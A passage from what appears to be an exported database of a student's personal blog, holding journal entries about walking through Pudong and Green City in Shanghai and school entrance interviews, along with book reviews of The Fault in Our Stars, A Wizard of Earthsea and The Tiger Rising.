buy\na villa in Green City. Located in the north of the Pudong district,\nGreen City is the biggest international community in Shanghai and an\nideal place to live in.\n\nBeing one of the richest communities in Shanghai, Green City is known\nfor its low density of people and high quality of life.\n\n![image](https://cdn.jimchen.me/284822461-9c5e632e-217f-4cf9-a8d0-2970c904cbb6.png)\\\n\n## A Tranquil Journey\n\nI live in Zhangjiang High-tech Park so I usually go there from Yunshan\nRoad. On the way between Longdong Avenue and Jinxiu Road, there is a\nsmall river, some luxurious houses, and a park in construction. There\nare no people and cars, yet the trees are in good order. I could see far\non that road and there aren't any tall buildings along the way. The\nroads are neat and organized. Everything is still. There are no\ninterfering roads in two kilometers.\n\nWhen I got on the bridge that crossed the river I saw the moon shining\nbrightly in the sky. I could clearly see the paths along with the river\nand feel the calmness of the river. Its surface is smooth and takes in\neverything from above. The tall trees on two sides of the river and the\nstreetlight that shows the way are in reflection. That is a time when I\nfeel true to myself and free again, away from boundaries and pressure in\nmy daily life.\n\n![image](https://cdn.jimchen.me/284822474-bf6b4130-4f60-4053-a9f8-d6a12b3f88c9.png)\n\nIt usually takes 40 minutes to walk to Jinxiu Road and another 15\nminutes to arrive at Biyun Road. There is a shopping center where I can\nbuy a bottle of water in Carrefour or eat dinner.\n\nThey were constructing in later parts of Yunshan Road. They were\nbuilding line 18. I do not know when it will be finished. I hope it\nwould be finished sooner for I was counting on it to go to Yangpu\ndistrict a lot quicker that way. But I may not be in Shanghai by the\ntime it is finished.\n\n![image](https://cdn.jimchen.me/1d79ab03-f7a6-4ebe-8988-203f000f977c)\n\n## Sports and Recreation\n\n\nGreen City is great for sport, too. There is a Decathlon and a stadium\neast of the shopping mall. Besides the stadium, there are also lots of\nrestaurants. I remember Italian and American restaurants selling their\nlocal food. The food seems strange to me and as I am not interested in\neating as much as I am interested in walking, I usually eat a simple\nmeal at the shopping center.\n\nThere is a swimming pool and as I walked through the stadium I could\nclearly see it. On my right side, there is a soccer field. I walked past\nand came to Lantian Road. The subway station is on Yanggao Road, about\n300 meters from me. I turned right and there is a park. The park looks\nsmall but it is long and really beautiful.\n\n![image](https://cdn.jimchen.me/8e837dfd-5f66-4365-84dd-a1654fb562dc)\n\n## Cultural Experiences\n\nIf you walk along Biyun Road to Hongfeng Street and keep walking, you\nmay find a path leading into a small river. There is an art museum along\nthe river. The museum is designed for ancient Chinese clothing and a\nwoman takes a picture of you on a seat if you want. The picture is taken\nand sent for free. The food and drinks in that art museum are really\nexpensive. There is a library in the museum.\n\nKeep on to the path on the side of the river and there is an office\npark. I entered it from small paths leading up from the river. There is\na pond inside it and there are many companies. The environment inside is\nreally good.\n\n![image](https://cdn.jimchen.me/0ac8e9ab-4bc5-4d23-a89b-9cd2d4e5ba60)\n\nOn the intersection of Hongfeng Road and MingYue Road, there are two\nmarkets, one big and one small. From there you can buy a lot of exported\nthings. There is a bakery inside the big market called City Shop. There\nare different types of milk from Australia, America, and all over the\nworld in City Shop. There are also different types of snacks-chocolates,\nbiscuits-with no Chinese written on them. I usually come alone and don't\nhave much money or space in my bag for these things, so I usually just\nbuy water to drink.\n\n## Nightlife and Dining\n\nThere are bars and restaurants along Hongfeng Road. But it is far from\nthe restaurants in the city center. They are just small restaurants and\nare much quieter.\n\nI see lots of foreigners talking in bars and restaurants, people with\nwhite hair and mustache, young men with blonde hair, laughing and\ndrinking. None of them are too noisy. The restaurants are not crowded\nbut rather comfortable.\\\n![image](https://cdn.jimchen.me/60555d79-8f8a-4a44-a692-69fd5020a6c5)\n\n## Residential Charm\n\n\nThen it was usually time for me to return home. As I went through the\ngardens and villas, I couldn't help but admire them. On Mingyue Road the\nroads are well-built and trees grow on both sides of the street. It is\nalways pleasant to walk between tall trees. On the smaller roads, there\nare chairs, and sitting there, I could see the schools and houses on\neither way of the street. There were some people coming and I saw that a\nfather riding bike with his son and telling him not to be naughty. I saw\nan elder woman returning home from shopping.\n\n![image](https://cdn.jimchen.me/a32fc141-e80e-45c2-8545-6d0adaf0ce98)\n\n## Conclusion\n\n\nI wanted to remain there all day. There is so much to see. What\nimpressed me is the beauty of life. Green City is the best neighborhood\nin Shanghai, but everything is so expensive. It is not only a green and\nbeautiful place but also a part where the culture is diverse, and life\ncan be peaceful and enjoyable."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded2"}, "title": "Walking in Pudong", "date": {"$date": "2021-07-26T08:00:00Z"}, "type": "journal", "access": 1, "body": "## Life in Pudong\n\nI live in the Pudong district and really like it here. As I am always\nenergetic and had been to lots of interesting places, I'd like to share\nwith you some of my experiences.\n\n## Pudong's Appeal\n\nOne thing I like about Pudong is that it is much quieter and less\ncrowded than the city center. There are fewer people and cars in Pudong\nand more trees, so the environment is better and it is a better place\nfor walking.\n\n## Suburban Explorations\n\nIn eighth grade, I decided I hate the noise in the city center. (for at\nthat time I lived near Zhongxing Road) I wanted to find a quiet place\nwhere I could be myself. I used to go alone on subways to the terminal\nstation. There were not many people in the countryside, but it was\nalways deserted there. Sometimes so bare and bleak that it seemed like I\nam the only person in kilometers.\n\nIt is not really great near Yuandong Avenue Station, for you can't get\nany water to drink and may face the danger of being attacked by wild\ndogs in villages. This picture is near that station.\n\nSome of these places are ok during the daytime, though in some places\nthere are trucks, like the place near Line 5 Xidu station. All I could\nsmell was smoke and gas when they speed past.\n\n## Countryside Encounters\n\nBut these places are bad to go to at nighttime. When I was walking on\nJinke road and came to Shanghai Aircraft Design and Research Institute\n(down Huaxia Road), I thought about turning left for I didn't know about\nthat place. It felt scary and ghostly. There are two fields that look\nlike farmland, except that the grass in it is as tall as man, with\nnothing that looks like a building in sight. There were the calls of\ninsects in there. There were no cars, except for a few people learning\ncars who are driving slowly around. But the roads are unbuilt and I had\nto go back and forth to find my way, always turning back. The roads end\nsuddenly and it looks unfinished. At some point, I tried to see what was\nbeyond a road that ends in the middle when a man came out of a house and\nasked what I was doing. It scared me because it was dark there. I was\ntaken aback and hurriedly got away. After that, I think that place is\nhaunted.\n\nIn other places, like the Shendu highway in the south of Pudong, there\nare farms and fruits there. I saw grapes and peaches. They grow in\ngreenhouses. There are even farmers there.\n\nIf you still can't get a vivid picture of the countryside from my\ndescription, well just go see for it yourself and you'll see what I\nmean.\n\n## Personal Wanderlust\n\nI am just a restless boy eager to travel far away and always wandering\naround for no clear reason. I decided that it is normal, but I found few\npeople like me.\n\nThese days the typhoon is really annoying me as I have to stay at home.\nBut I must also count myself lucky since so many people are working\nthese days just to maintain our daily life and ensure our safety.\nAnyway, I hope all will be back to normal soon."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded3"}, "title": "End of Ninth-grade First Semester", "date": {"$date": "2021-01-25T08:32:00Z"}, "type": "journal", "access": 1, "body": "## How school was at the end of December\n\nAt the end of December, things in school became duller than ever.\n\nThere were no more new things to study. every day was reviewing and\nrepeating.\n\nTeachers were getting anxious, and students were more anxious. Teachers\nworried whether students would be admitted to good high schools. The\nfirst mock exam was drawing nearer.\n\nSome students had already been admitted to good schools, only afraid to\nbe rejected. Other students were working so hard, trying to be admitted\nto lower-level schools.\n\nThat was why some students were preparing for their high school\ncompetitions and busy showing off while other students were struggling\nunder great pressure.\n\nAlthough I said I wanted to go to an International school, the teacher\nstill moved me to the front row. Being in the front row meant being\nwatched by the teachers 10 hours a day and sitting with lots of other\nanxious students.\n\nI felt extremely lonely these days. The school was killing me.\n\n## How I walked to entertain myself\n\nEvery Friday I walked along the Huangpu River. I walked on the south\npart of the route, from the China Art Museum to the Oriental Sports\nCenter. These days were too cold for running, so my only entertainment\nwas walking. Looking into the wide space, seeing how big the world\nreally is made me realize how little I was.\n\nThere are lots of places to rest along the route. I walked inside to get\nhot water and a place to rest. I saw the date 19-12-21. I thought about\nhow much of 2019 was left. Oh, such a long year. I matured a lot. Yet it\nwas suddenly ending.\n\nI thought about the famous poet Su Shi said\n\nIf you look at its changing aspect, the universe passes in the twinkling\nof an eye; but if you look at its changeless aspect, all creatures\nincluding ourselves are imperishable.\n\nEverything is going to pass away, even money, people. We are but little\ninsects in the world, our lives nothing of a matter. Life is changeable\nand unstable. Thus treasuring the present, making use of the things you\nhave, and not wasting time is important. Knowing this can only make us\npay more attention to the present joys and enjoyments and be more than\nhappy to accept everything we have and the way they are instead of\nblaming the world for bad fortunes and few opportunities.\n\nHuangpu River is a beautiful river, so beautiful at night. There is a\nBowl-like building in Puxi and a tall white building in Pudong. There is\na big temperature building and a huge stone hand near the Nanpu Bridge.\nRivers with shiny bridges, green lawns, and beautiful flowers are all\nalong the way.\n\nI found a world of mine on those walks. It seemed I can put all my\nproblems on the wide horizon and never fill it up. I wanted to be like\nthat.\n\n## How I found interest in Math\n\nMath appeals to me more than ever. I studied math to get rid of the\nstress of other subjects. Math is so beautiful, so strict, yet so\nflexible.\n\nI studied maths at the organization Xueersi. The teacher is very smart.\nHe can calculate numbers fast as lightning. He is young and skinny. He\nalways smiles and he never talks about anything other than math in his\nclasses.\n\nI studied complex numbers, calculus, and vector there. I felt as if I\nwas going into a great new world when I study math. My skills improved\nreally fast these days.\n\nHow the first 10 days of 2020 was\n\nOn 2020.1.1 I went to Daning park to play. I saw many young children,\nbut not one as old as me.\n\nOn 1.7-1.9, we finally had the test. I got a good score, mainly because\nI got 129 in Chinese. I was really lucky that time.\n\nThese were the days when everything was happening at once. It was the\nclimax of 9th-grade.\n\nThe winter holiday I was waiting for finally came.\n\nBut then covid came."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded4"}, "title": "December of 2019", "date": {"$date": "2020-12-25T14:23:00Z"}, "type": "journal", "access": 1, "body": "December of 2019\n\n## The start of December------Busy With Tests\n\nThere was no snow that winter. With December came the high-school\nentering test and math competitions.\n\nI decided to go to an International school since my parents want me to\ngo to an American university and learn more. I applied to Shanghai World\nForeign Language Middle School.\n\n## School Entrance Tests\n\nThe test was arranged as follows\n\n-   8:00-10:00 Math\n\n-   10:30-12:00 Chinese\n\n-   1:00-3:00 English\n\nThis is the schedule of the test. The math test was very easy and in the\nend, there were only 2 problems I didn't work out. The English test was\nhard and I didn't write the composition well.\n\nIn the evening, I felt tired and went out for a walk.\n\nIn 12.1 I came to Shanghai Pinghe Bilingual School to take their\napplication test. They only have math and English tests.\n\nThe math test is very easy and I soon worked out all the problems and\nchecked it again. The English test was very strange. Of all the entrance\ntests I've participated in, I never saw a test like that. The cloze has\na total worth of 16 points, while its total is only 28 points. I spent\nmy time wisely and did the test.\n\nAfter two tests I went for a walk along a small river, it was really\nrelaxing.\n\nBecause of me doing well in the tests, I was asked to enter the second\npart of the entrance exam. The second part was to be interviewed by two\nteachers.\n\nOn 12.11 I went to WFLS. They asked me to introduce myself in Chinese\nand English and ask questions to the others.\n\nIt was 3:00 in the afternoon and I was sitting in a room with 3 girls\nand 2 boys(including me).\n\nThe teacher: Stand up and introduce yourself. If you're ready, please\nraise your hand.\n\nOne by one, the others stood up and introduced themselves. A boy is good\nat walking long distances, a girl good at singing, English, and always\nhelping community.\n\nI was the fourth to raise my hand. I described my math skills and\nEnglish ability. I also said I can run really fast and can run 1km in\n3:27. They seemed impressed. The others never said about their math\nskills. They only said about their TOELF points and social activities.\n\nThen I went home feeling anxious and excited.\n## Math Competition\n\nIn 12,14 I went to join a math competition held by Shanghai math school.\nIt was easy and I had done so many similar tests at school (in fact, one\nday doing at least two of them). I did well in that test and got second\nprize(I was first in second prize).\n## School Interviews\n\nIn the afternoon I went to Pinghe school. Pinghe is located in Green\nCity in Pudong district. What beautiful places! The street is lined with\ntrees on both sides and you can see foreigners and big houses\neverywhere. It is one of the most beautiful places in Shanghai and an\ninternational community, Such an escape from the pressured, competing\nenvironment at school!\n\nI went inside the school, and, since I was to be called an hour later, I\nsat down in their cafeteria and read \"Ordinary World\".\n\nThen I was called, I went inside and to be interviewed by a foreign\nteacher.\n\nI said I liked math, and number theory best. He asked me if I would like\nto explain whether number theory is invented or is being discovered. I\nsaid man invent numbers and then the theories and hidden there for them\nto discover.\n\nI was then called up to the third floor and was interviewed by two\nfemale teachers. Looking back, I was really dissatisfied.\n\nFirstly the teacher asked me for my basic information.\n\n-   You study till how late in the night?\n\n-   Till ten, sometimes till eleven. I think efficiency is more\n    important than huge amounts of time spent. I think sufficient sleep\n    brings me more energy to focus in the daytime.\n\n-   You want to live on campus, right?\n\n-   Yes.\n\n-   Then what do you do if your roommate study at night?\n\n-   (I felt taken aback by this sudden attack.) I will associate with\n    him. If not successful I will call my parents and teachers and\n    listen to their advice.\n\n-   (sounding not OK)Ok\n\n-   You good at mathematics?\n\n-   Yes.\n\n-   What prizes have you got.\n\n-   Second prize in Shanghai math school competition in eighth-grade.\n\n-   That a prize in your school?\n\n-   (I felt surprised. They didn't even know what I was saying. How\n    strange! My brain froze at that time and I didn't know how to\n    explain myself. Amateur math school isn't a school like Shibei\n    middle school.) No.\n\n-   How many participants?\n\n-   300. \n\n(The teachers didn't seem impressed at all. I wanted to say, you don't\nknow my ability in math, and she was like thinking I'm not so good. But\nthose three hundred participants are among the best in Shanghai and I\ngot second prize. Pinghe school hasn't got one on the list. I feel\nconfident I can be number one in mathematics in your school.)\n\n-   Give you 1 minute. Explain this drawing.\n\n(It was a drawing of two robbers stealing artwork from a gallery. Except\nat that time, I didn't really understand. I thought they were preparing\nfor a gallery or something.)\n\n\\*\\*Note of author re-reading this material at 2023: I am very bad at\nunderstanding visual stuff at first glance. My brain is like a neural\nnetwork that needs a lot of training to think out of the box. I usually\nintepret everything my own way, either I am born with it or doing\nrepetitive difficult math tests in middle school made me do that\n\n(It showed two thieves, instead of stealing the artworks, took the label\naway. This drawing was supposed to tell us we need material objects more\nthan things from the surface.)\n\n-   Ok, you may go.(This time sounding Really not ok)\n\nI failed this interview.

But her life changed when she met\nAugustus Waters in the cancer support group and fell in love with him.\nAugustus suffered from cancer and had his leg cut off. Hazel recommended\nAn Imperial Affliction to Augustus. He was frustrated learning the novel\nends without a conclusion and used his one wish to go to Amsterdam to\nmeet the author, Peter Van Houten, to know about the ending of the book.\n\nHowever, Peter surprised them by appearing drunken and didn't answer\ntheir questions. Augustus confessed to Hazel his cancer has returned.\nBack to America, Augustus called Hazel and Isaac to his pre-funeral to\ngive and eulogy and died soon after it. Van Houten went to Augustus'\nfuneral to apologize to Hazel.\n\nHazel received Augustus' letter for him from Lidewij, former assistant\nof Van Houten. In the letter, Augustus said getting hurt was inevitable\nand was happy with his choice. The book ended with Hazel saying she\nloved her choices too.\n\n## Extracts and Quotes from the Book\n\n1.  My thoughts are stars I cannot fathom into constellations.\n\n2.  Gus, my love, I cannot tell you how thankful I am for our little\n    infinity. I wouldn't trade it for the world. You gave me a forever\n    within the numbered days, and I'm grateful\n\n3.  Right, of course. But you keep the promise anyway. That's what love\n    is. Love is keeping the promise anyway.\n\n4.  You realize that trying to keep your distance from me will not\n    lessen my affection for you? All efforts to save me from you will\n    fail.\n\n5.  I'm in love with you, and I know that love is just a shout into the\n    void, and that oblivion is inevitable, and that we're all doomed and\n    that there will come a day when all our labor has been returned to\n    dust, and I know the sun will swallow the only earth we'll ever\n    have, and I am in love with you.\n\n6.  The world is not a wish granting factory.\n\n7.  But I will say this: When the scientists of the future show up at my\n    house with robot eyes and they tell me to try them on, I will tell\n    the scientists to screw off, because I do not want to see a world\n    without him.\n\n8.  Some infinities are bigger than other infinities.\n\n## My Idea\n\nThe Fault in Our Stars is a heart-breaking book filled with humor that\nmakes you want to laugh and cry at the same time when reading it.\n\nCancer is so cruel. In the book The Tiger Rising, cancer killed Rob's\nmother, leaving Rob unprotected and depressed. In this book, it\ndestroyed lives. Hazel Grace has cancer when she was thirteen and\nsuffered from it. As we can see, before she met Augustus, she thought\nher life has ended, it was just that she hasn't died. And we can see how\ndepressed Hazel was. She'd give up her whole life for a few happy days.\nMelancholy, frustrated, pessimistic was Hazel when she went into the\nsupport group and met Augustus Waters.\n\nHowever, once Hazel met Augustus at the support group, she instantly\ndiscovered an attraction towards him because of his appearance. When\nHazel spoke to Augustus that human beings will be dead and there's no\none to remember them, a line she learned from An Imperial Affliction, it\ncreated a bond between them, which made them inseparable.\n\nAugustus asked Hazel to come to his house. When he gave Hazel his\nfavorite book The Price of Dawn. Then they watched V for Vendetta in the\nbasement. It was at this point that they became closer to each other and\nthe relationship between them began to develop. After the talk and the\nexchange of books, they were not just normal friends, but close friends.\nIt was because they both have cancer and suffer from it. They share the\nsame experience while Hazel became depressed and Augustus didn't and\nstill enjoyed life. At this point, Hazel was looking for someone\ncheerful and humorous and found Augustus. They could communicate and\nunderstand each other while most people in the society couldn't.\n\nHazel liked the Price of Dawn and stayed up reading it. It wasn't\nbecause it had taught her lessons like AIA, but because reading it was\nfunny and entertaining, it allows you to take a break and enjoy yourself\nfreely like a child. Sometimes, we need these things to slow us down and\nhelp us to get rid of pressure in life.\n\nIn chapter three, Hazel's mother's celebration of \"half birthday\" seemed\nvery queer. However, if we looked deeper Ito it, we can see she really\nmeant Hazel had survived another half year by using Phalanxifor. Since\nHazel got the cancer, Hazel's mother had worried about her health. It\nshowed she is affectionate.\n\nThen we came to the plot when Isaac was crying about his eyes being cut\nout. I felt sympathetic for him. When I first looked at the plot, I\nthought Monica was bad. However, when I thought again, I came to this\nquestion: who'd like to be in love with a blind person and care for him\nthe rest of his life? I began to understand that we shouldn't just blame\nher. She had done wrong things but how many could stand the situation,\nor, even worse, didn't just simply break up and kind of forsake him\nafterwards. Things are that confusing in real life. There are some bad\nthings in life which make you so angry you want to explode. But if you\nlook deeper, you cannot find a person directly responsible to it. Maybe\nit's destiny.\n\nWhen their friendship got more deeper, Augustus asked Hazel to go to\nAmsterdam. The ending of AIA is what Hazel wanted to know all her life\nbecause AIA is the only book she read after she got her cancer and a\nbook which she felt involved in. AIA is a reference Hazel found for her\nreal life. That's why when she got the chance to see Van Houten and knew\nwhat the ending of AIA is, she desperately wanted to go there, ignoring\nher body conditions.\n\nBefore they went to Amsterdam, Augustus took a scan and his body \"lit up\nlike a Christmas tree\". But knowing Hazel was going to die anytime soon\nand this may be the last trip together he insisted to go to Amsterdam.\n\nWhen Hazel arrived and discovered that Peter Van Houten is crazy, she\nwas so disappointed. She was desperate while Peter Van not only didn't\nanswer her questions but drove them out of the house, she thought her\nlife was over the second time. This tend to be a closer relationship\nbetween she and Augustus.\n\nFinally, Hazel painfully returned to normal life. At the fake funeral\nHazel expressed her feelings about the little infinity between them. It\nis a thing we can come across but can't demand. It is a thing of great\nvalue that we should always treasure it.\n\nCancer killed Augustus Waters at last and ended the relationship. She\nwas so sad about his death. I think the condolences people write about\nhim were not unreal but was said without thinking. Why didn't you care\nabout someone when he is alive but act so sad when he dies? It infers we\nonly care about something when it passes away, and there are few things\nthat can return once it passed away. We should always cherish what we\nhave now.\n\nThis book is really touching and made me sad for a long time. I learnt\nthat though sometimes the things that pass away couldn't return, we can\nlearn from them and keep them forever in our hearts."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded6"}, "title": "A Wizard of Earthsea Book Review", "date": {"$date": "2018-12-04T11:51:00Z"}, "type": "literature", "access": 1, "body": "## Introduction\n\nA Wizard of Earthsea is a classic fantasy novel written by Ursula K. Le\nGuin about fifty years ago. It won numerous awards and is popular among\nteenagars. The book has many morals in it. I will analyse it with a\ndescription of its plot.\n\n![alt text](https://cdn.jimchen.me/33f02433-521e-4748-beab-b1f955a6bc88_image.png)\n\n## Ged's Journey\n\nGed first learned magic from his aunt. With a gift in magic, he proved\nit when he saved his villagers from invaders. However, his aunt is a\nwitch who knew little about magic and could not satisfy Ged. This led to\nGed's hunger in learning magic and proving himself.\n\nThus, when Ogion taught him almost nothing he became impatient, Ogion\nwanted to teach him to be silent and listen while he wanted to learn\nspells. He was arrogant and not contented, he wanted his talent in\nsorcery to be realized. That's why he couldn't stand the girl's teasing\nand released the shadow. But he wasn't strong enough that time and Ogion\nwas there to protect him. The shadow settled him and ceased his\narrogance for some time. But his decision to go to Role showed it was\nstill in his heart, and it would lead to danger at any second.\n\nWhen Ged arrived at Role, he began learning fast, contenting himself\nwith books and losing awe in everybody, even the Archmage, When Jasper\nlooked down on Ged, he desperately wanted to show himself, He wanted\neverybody to watch him with awe. At the feast, Ged forgot everything.\nThe only thing he wanted to do was to beat Jasper. When Jasper asked him\nto summon a spirit, he put the fear of the first shadow he released away\nfrom his mind. The first shadow showed Ged was a fool and he wanted to\nsay he wasn't. Though Ged verified himself at last, it led to the\nArchmage's death and his scar.\n![alt text](https://cdn.jimchen.me/a102111d-717f-4e86-9b6e-bc5add68e67d_image-1.png)\nFinally, Ged's brain cleared and realized he is nothing but a big fool.\nHe lost everything he tried to get. He was self-conscience and guilty.\nHe wanted to do something good. So, he became selfless, the one who he\nshould be at first.\n\n![alt text](https://cdn.jimchen.me/1459e935-9555-4ff3-8cab-0337d36f6600_image-2.png)\n\n## Key Themes\n\nGed, with his strong will and bravery, defeated the dragon and protected\nthe people of Low Torning; with his mind turned far from fame and\nwealth, withstand the lure of the stone to rule the world; with his\nstrong hate of his old self, followed Ogion's advice and went hunting\nafter the shadow. After much efforts Ged finally became whole again.\nThis book told us to stay modest and silent. The shadow represents the\ntedious and boring things in life we must do. We shouldn't let them\nbother us but face them bravely and defeat them. Only then, we can be\nwhole.\n\n![alt text](https://cdn.jimchen.me/88d5f38a-15b9-4f62-8479-fb5779e14f0a_image-3.png)\nAnother thing to notice is that Ged is dark-shinned unlike other heroes.\nIt showed that we needn't be white-skinned needn't be perfect to be a\nhero or to do great hings.\n\n## Conclusion\n\nA Wizard of Earthsea is unlike any other fantasy books I've read. It is\nnot only a book for children but also for adults. It is to be read and\ntaken in slowly. It is much serious in magic than any other novels. It\nis a classic, still famous half a century after its publication.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded7"}, "title": "My Journey in Reading", "date": {"$date": "2018-09-10T18:08:00Z"}, "type": "literature", "access": 1, "body": "## My Experience in Reading\n\nToday is approximately three years since I first started to be\ninterested in reading. That was in fifth grade when my primary school\nheld a program called Readathon.\n\nI described my attitude toward reading in fourth-grade in an\nautobiography:\n\n\"I didn't like reading at all. I could only read books that only have\nfour lines on a page. My parents made me do it, and I thought it was\nboring.\"\n\nHere's the feeling inside me when I went to the library:\n\n\"Seeing so many books made me kind of scared and amazed; I was hoping to\nfind a good book when I spotted Junie B. Jones Aloha-ha-ha on a shelf. I\ngot interested in the title of this book, so I borrowed it and started\nto read it.\n\nWhen I started reading, I found out that this book is so funny. There\nwere almost twenty lines on a page. I was so surprised and proud that I\ncould read forty-five pages in one day, five times than before.\"\n\nReading is not a thing to be forced. One must be interested in reading\nin order to learn. For example, when my mother forced me to read in\nfourth grade, I didn't like reading at all. However, when I was\ninterested myself, I read so much that I couldn't believe it myself.\n\n\\*\\*Note of author re-reading this material at 2023 in university, I\npractically hate everything that is assigned to me, even till now.\nHowever, I find a strange passion in certain things I came across, like\nLinux and frontend development\n\nBut how to be interested in reading? Don't start with 300 hundred-page\nnovels or classics with words all over the pages, start with simple\nbooks that make you interested, and every time when you start a new\nseries, increase the level a little bit. After weeks, months, and years,\nyou will certainly be surprised. I was in fifth grade when I read Junie\nB., a first-grade level book. I was even impressed that I read a book\nwith only fifteen lines, forty-five pages a day. Funny, isn't it?\nHowever, I read the Narnia series less than a year after it, and the\nHarry Potter series after 18 months.\n\nDon't be too happy, of course. All of these achievements are based on\nthe genuine love of the book. Don't care about your speed, but how much\nyou can get, what you can learn, and what the author wants to tell us\nafter reading a book. Don't be ashamed that you aren't the best reader\nin class. Reading is a long-term activity.\n\nAfter reading one of Junie B.'s books, I also borrowed A to Z mysteries,\nMagic Tree House, and Ready Freddy. I finished one book from each\nseries. I was amused because of the fun it brought to me, the wonderful\nadventures in these books.\n\nAs the saying goes: A reader lives a thousand lives before he dies. The\nman who never reads lives only one. I believe it because, as a matter of\nfact, I think I have already lived more than one life. Every time I\nopened a book, I became the main character, and I laughed and cried with\nthem. I live the lives of the character in the book. Sometimes, I was so\ninto one book that it was seconds after I closed the book that I\nrealized that I am in my house, not in one of those adventures.\n\nJunie B is a funny series about Junie B.'s kindergarten and first-grade\nlife. I laughed so much when reading it my stomach hurts. It describes\nlife in a first grader's eyes vividly and its language amazed me. I\nstill used some of them in my compositions.\n\nIt is a really easy series for me now. Last year I went to a Barnes &\nNoble bookstore in California when I found it. I read a book again in\nabout 10 minutes. So don't be disappointed. You can improve much much\nfaster than you ever dreamed.\n\nThat was the start of my reading career. The next series is Magic Tree\nHouse. I think many people know this series so I am not going into\ndetails, just to talk about the series in my eyes.\n\nI am now going to tell you a thing more even more hilarious. I couldn't\nunderstand what the first book is about when I first started to read it.\nIt was not until I read it the second time that I began to understand.\nThen I was amused by the adventures of Jack and Annie, who saved so many\npeople from disasters and helped the great man to success. I began to\nunderstand the rest of the series after I finished the first one.\n\nI read the whole Magic Tree House series, all 57 of them. It almost\nbecame a tradition for me to borrow a book from the school library\nbefore lunch, read through the lunch break, and read through the class\nbreak in the afternoon. I usually finish it before school ends and\ndevote my time at home doing homework, studying math, and doing\nexercises.\n\nAfter winter vacation, I didn't enjoy some other book series. They have\nthe same style and it was so boring reading them. However, I later found\nsome series as good as Junie B series.\n\nI read many mystery novels. A mystery involves a puzzle to be sold\n(usually a crime). The author introduces the crime and gives clues to\nthe readers. The clues give readers an impression of the crime.\n\nMystery usually has a complicated process of analysis. It makes a book\nfascinating to read when readers are trying to figure out the truth. But\nalso in this process of solving the crime, the author gave the\ncharacters a detailed description, usually concerning their reactions\nand attitudes toward the crime. This often shows the personalities of\npeople and the meanings behind them.\n\nNow I've read many books, from easy ones to thousand-page ones. I have\nalso read many young adult books, and fantasies. Reading is a process to\nbe enjoyed by everyone, to remove the stress in everyday life."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded8"}, "title": "The Tiger Rising Book Review(Part 2)", "date": {"$date": "2018-07-17T10:02:00Z"}, "type": "literature", "access": 1, "body": "## Chapter 19-24\n\n### Part One A Brief Summary\n\nRob got the key of the cage from Beauchamp, who asked him to feed it meat. Though Sistine tried to convince Rob to free the tiger, Rob didn't and they went back to the hotel. They then showed Willie May the tiger and Rob decided to free the tiger.\n\n### Part Two Impressive Plots\n\n1 A Wonderful Plot\n\nHe looked up at the dark outside of the sign and recalled lying on a blanket, staring up at a big oak tree. His mother had been on one side of him, and his father, asleep and snoring, bad been on the other. He remembered that his mother had taken hold of his hand and pointed up at the sun shining through the leaves of the tree and said, \"Look, Rob, I have never in my life see a prettier color of green, Ain't it perfect?\"\n\nExplanation\n\nThis is only a short paragraph but has many meanings in it. It is about Rob's memory about a regular day. Though regular for us, it isn't for Rob. Because of the cruelty of cancer, this kind of day never exist, it can only be a memory, a small part inside the suitcase.\n\nThus the scene of the three of them, lying under a tree, had been so happy, and wonderful because his mother and smiling father are there with him.\n\n2 A Sad Plot\n\nBut she didn't stop. She shook the cage and beat her head against the chainlink, and then heard her gasp. He was afraid that maybe she was chocking. He went and stood next to her. And he saw that she was crying. Crying. Sistine.\n\nBefore Rob could think whether it was right or whether it was wrong, he reached out and put his palm on Sistine's neck. He could feel her pulse, beating in time with the tiger's pacing. He whispered to her the same words hismother had whispered to him. \"I got you,\" he told her. \"I got good hold of you.\"\n\nSistine cried and cried. She cried as if she would never stop. And she did not tell him to take his hand away.\n\nExplanation\n\nThis plot above is about Sistine cring after seeing the tiger in the cage and Rob using his mother's way to comfort Sistine.\n\nSistine saw the tiger and thought of herself, and she found out that she, like the tiger, was locked in a cage. The cage is school and her mother. She couldn't get out of the cage like the tiger. That's why she cried and cried. It is really sad and heart-breaking. For Rob, it was really surprising. Then Rob, thought about his situation and school, but he didn't cry. His suitcase, at this point, isn't completely open. His sympathy for Sistine impelled him to try to comfort her, just like his mother did to him.\n\n### Part Three My Idea\n\nIn these six chapters, the main characters are Rob, Sistine, and Willie May. The story is so realistic that I thought it's happening right in front of my eyes, but not in the book.\n\nChapter 19 is about Beauchamp giving meat and keys to Rob to feed the tiger. We can see that Beauchamp is afraid of the tiger because he looked away from its stare, and trembled when feeding it.\n\nThe reason Beauchmp afraid to the tiger is easy. It is because he didn't pay respect to the tiger, while the tiger is stronger than Beauchamp.The tiger needs freedom whild Beauchamp put him in a cage. That's why he was afraid. So everything he did to the tiger was careful. He was afraid that the tiger would rise up and attack him, that's why \"His forehead was shiny with sweat, and his hands were trembling \" when he opened the cage.\n\nChapter 20 is about Rob and Sistine seeing the tiger. Why did Sistine cry when she shook the cage? The significance of the tiger's cage for Rob is it symbolizes his feelings and the cage is like the suitcase. Rob found it difficult to look at the caged tiger because he didn't want to face it, didn't want to face his emotions, and didn't want to cry again.\n\nChapter 21 is mainly about Willie May. We can see that she experienced all kinds of sadness and anger so she can see it clearly. Willie May saw the anger in Sistine directly. It uses prophetess to show this.\n\nChapter 22 is about Rob's father. A hard man, he is. His hardness used to com bine with Caroline's tenderness, but erupted after Rob's mother's death. That's why he became angry all again.\n\nIn chapter 23 and 24, Willie May appeared again. It showed how much she cared for her bird Cricket and how Sistine's mother had treat Sistine.\n\nThese six chapters describes things which happened after Rob got the key. It isn't much, but really are emotional affecting. Let's see how the tiger was freed next time.\n\n\u200b\n\n## Chapter 25-30\n\n### Part One A Brief Summay\n\nRob freed the tiger but his father shooted it. Rob hitted his father but it was no use. So Rob let the suitcase open and finally understand his father. They buried the tiger together with Sistine and Willie May. Then Rob and his father decided to move back to their life.\n\n### Part Two Impressive Plots\n\n1 An Angry Plot\n\nAnd when Rob saw the tiger on the ground and his father standing over it, holding the rifle, he felt something rise up in him, an anger as big and powerful as the tiger. Bigger.\n\n\"You killed him.\" he said to his father.\n\n\"I had to,\" his father said.\n\n\"That was my tiger!\" Rob screamed. \"You killed him! You killed my tiger!\" He ran at his father and attacked him. He beat him with his fists. He kicked him. But his father stood like a wall. He held the gun up over his head and kept his 